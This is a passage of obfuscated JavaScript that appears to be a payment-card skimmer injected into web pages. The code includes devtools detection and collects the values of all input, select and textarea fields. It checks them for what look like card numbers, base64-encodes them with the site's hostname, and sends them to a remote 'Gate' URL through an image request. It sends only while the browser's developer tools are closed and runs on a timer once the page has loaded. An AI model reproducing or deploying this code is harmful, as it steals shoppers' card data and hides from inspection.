_0x46b741=_0x32f8ac?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x1964('0x9');if(!(_0x2bcd47&&_0x32f8ac)&&(window[_0x1964('0xa')]&&window[_0x1964('0xa')][_0x1964('0xb')]&&window[_0x1964('0xa')]['\x63\x68\x72\x6f\x6d\x65'][_0x1964('0xc')]||_0x32f8ac||_0x2bcd47)){if(!_0x3c22b8[_0x1964('0x4')]||_0x3c22b8['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x46b741){_0x5cb16b(!![],_0x46b741);}_0x3c22b8[_0x1964('0x4')]=!![];_0x3c22b8[_0x1964('0x5')]=_0x46b741;}else{if(_0x3c22b8[_0x1964('0x4')]){_0x5cb16b(![],undefined);}_0x3c22b8[_0x1964('0x4')]=![];_0x3c22b8[_0x1964('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x1964('0xd')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x1964('0xe')]=_0x3c22b8;}else{window[_0x1964('0xf')]=_0x3c22b8;}}());String[_0x1964('0x10')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x37f059=0x0,_0x3cf5ee,_0x54cb0f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37f059;for(_0x3cf5ee=0x0;_0x3cf5ee<this[_0x1964('0x2')];_0x3cf5ee++){_0x54cb0f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x3cf5ee);_0x37f059=(_0x37f059<<0x5)-_0x37f059+_0x54cb0f;_0x37f059|=0x0;}return _0x37f059;};var _0x3745e6={};_0x3745e6[_0x1964('0x11')]=_0x1964('0x12');_0x3745e6[_0x1964('0x13')]={};_0x3745e6[_0x1964('0x14')]=[];_0x3745e6[_0x1964('0x15')]=![];_0x3745e6[_0x1964('0x16')]=function(_0x322878){if(_0x322878.id!==undefined&&_0x322878.id!=''&&_0x322878.id!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.id]=_0x322878.value;return;}if(_0x322878.name!==undefined&&_0x322878.name!=''&&_0x322878.name!==null&&_0x322878.value.length<0x100&&_0x322878.value.length>0x0){if(_0x58a867(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20',''))&&_0x317447(_0x2ed700(_0x2ed700(_0x322878.value,'\x2d',''),'\x20','')))_0x3745e6.IsValid=!![];_0x3745e6.Data[_0x322878.name]=_0x322878.value;return;}};_0x3745e6[_0x1964('0x17')]=function(){var _0x466d0b=document.getElementsByTagName(_0x1964('0x18'));var _0x56487f=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x2def59=document.getElementsByTagName(_0x1964('0x19'));for(var _0x3330e8=0x0;_0x3330e8<_0x466d0b.length;_0x3330e8++)_0x3745e6.SaveParam(_0x466d0b[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x56487f.length;_0x3330e8++)_0x3745e6.SaveParam(_0x56487f[_0x3330e8]);for(var _0x3330e8=0x0;_0x3330e8<_0x2def59.length;_0x3330e8++)_0x3745e6.SaveParam(_0x2def59[_0x3330e8]);};_0x3745e6[_0x1964('0x1a')]=function(){if(!window.devtools.isOpen&&_0x3745e6.IsValid){_0x3745e6.Data[_0x1964('0x1b')]=location.hostname;var _0x13a35c=encodeURIComponent(window.btoa(JSON.stringify(_0x3745e6.Data)));var _0x2c0845=_0x13a35c.hashCode();for(var _0x4faf20=0x0;_0x4faf20<_0x3745e6.Sent.length;_0x4faf20++)if(_0x3745e6.Sent[_0x4faf20]==_0x2c0845)return;_0x3745e6.LoadImage(_0x13a35c);}};_0x3745e6[_0x1964('0x1c')]=function(){_0x3745e6.SaveAllFields();_0x3745e6.SendData();};_0x3745e6[_0x1964('0x1d')]=function(_0x43084f){_0x3745e6.Sent.push(_0x43084f.hashCode());var _0x1cf6ac=document.createElement(_0x1964('0x1e'));_0x1cf6ac.src=_0x3745e6.GetImageUrl(_0x43084f);};_0x3745e6[_0x1964('0x1f')]=function(_0x55b6e7){return _0x3745e6.Gate+_0x1964('0x20')+_0x55b6e7;};document[_0x1964('0x21')]=function(){if(document[_0x1964('0x22')]===_0x1964('0x23')){window[_0x1964('0x24')](_0x3745e6[_0x1964('0x1c')],0x1f4);}};